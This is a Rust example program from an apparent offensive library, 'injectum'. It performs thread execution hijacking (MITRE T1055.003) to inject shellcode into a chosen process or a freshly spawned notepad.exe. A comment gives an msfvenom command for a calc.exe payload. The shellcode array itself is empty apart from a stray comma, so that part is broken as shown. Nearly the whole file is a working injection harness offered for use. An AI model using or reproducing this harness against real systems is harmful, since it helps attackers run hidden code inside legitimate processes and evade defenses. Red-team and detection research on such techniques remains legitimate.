//! Example: T1055.003 - Thread Execution Hijacking
//!
//! Build:
//! ```sh
//! cargo build --package injectum --example T1055_003_Thread_Hijacking --features "tracing,T1055_003" --release
//! ```
//!
//! Usage:
//! ```sh
//! ./T1055_003_Thread_Hijacking.exe [PID]
//! ```
//!
//! * PID      : (Optional) Process ID. If missing, a new 'notepad.exe' process is spawned.

#[cfg(not(feature = "tracing"))]
mod logs {
    #[macro_export]
    macro_rules! error { ($($arg:tt)*) => { let _ = format_args!($($arg)*); }; }
    #[macro_export]
    macro_rules! info { ($($arg:tt)*) => { let _ = format_args!($($arg)*); }; }
    #[macro_export]
    macro_rules! warn { ($($arg:tt)*) => { let _ = format_args!($($arg)*); }; }
}

use injectum::{
    Error, InjectorBuilder, Payload, PayloadMetadata, Result, Target, Technique,
    strategy::ThreadExecutionHijacking,
};
use std::{env::args, process::Command};
#[cfg(feature = "tracing")]
use tracing::{error, info, warn};

// Don't trust me, generate your own payloads!
// msfvenom -p windows/x64/exec CMD=calc.exe -f rust
const SHELLCODE: &[u8] = &[
    ,
];

fn main() {
    if let Err(e) = run() {
        error!("{}", e);
    }
}

fn run() -> Result<()> {
    setup_logging();
    let process_id = parse_args()?;

    info!("------------------------------------------------");
    info!("Target Process ID : {}", process_id);
    info!("Technique         : T1055.003 (Thread Execution Hijacking)");
    info!("Payload           : Shellcode");
    info!("------------------------------------------------");

    inject_thread_hijacking(process_id)?;

    info!("Success: Injection completed.");
    Ok(())
}

/// Performs Thread Execution Hijacking.
fn inject_thread_hijacking(process_id: u32) -> Result<()> {
    let payload = Payload::Shellcode {
        bytes: SHELLCODE.to_vec(),
        metadata: PayloadMetadata {
            description: Some("Calc.exe Shellcode".into()),
            origin: Some("MSFvenom".into()),
            safe_sample: true,
            labels: vec!["demo".into()],
        },
    };
    let technique = Technique::T1055_003(ThreadExecutionHijacking::ThreadHijacking);

    InjectorBuilder::new()
        .target(Target::Pid(process_id))
        .technique(technique)
        .payload(payload)
        .execute()
}

/// Parses CLI arguments and validates the PID.
fn parse_args() -> Result<u32> {
    let cli_args: Vec<String> = args().collect();

    // 1. Parse PID (Optional)
    if cli_args.len() > 1 {
        cli_args[1]
            .parse::<u32>()
            .map_err(|_| Error::Validation("Invalid PID. Must be a positive integer.".into()))
    } else {
        warn!("No PID provided. Spawning 'notepad.exe' as target...");
        let child = Command::new("notepad.exe")
            .spawn()
            .map_err(|e| Error::Validation(format!("Failed to spawn target: {}", e)))?;
        Ok(child.id())
    }
}

fn setup_logging() {
    #[cfg(feature = "tracing")]
    {
        use tracing_subscriber::EnvFilter;
        let _ = tracing_subscriber::fmt()
            .with_target(true)
            .with_env_filter(
                EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info")),
            )
            .without_time()
            .try_init();
    }
}
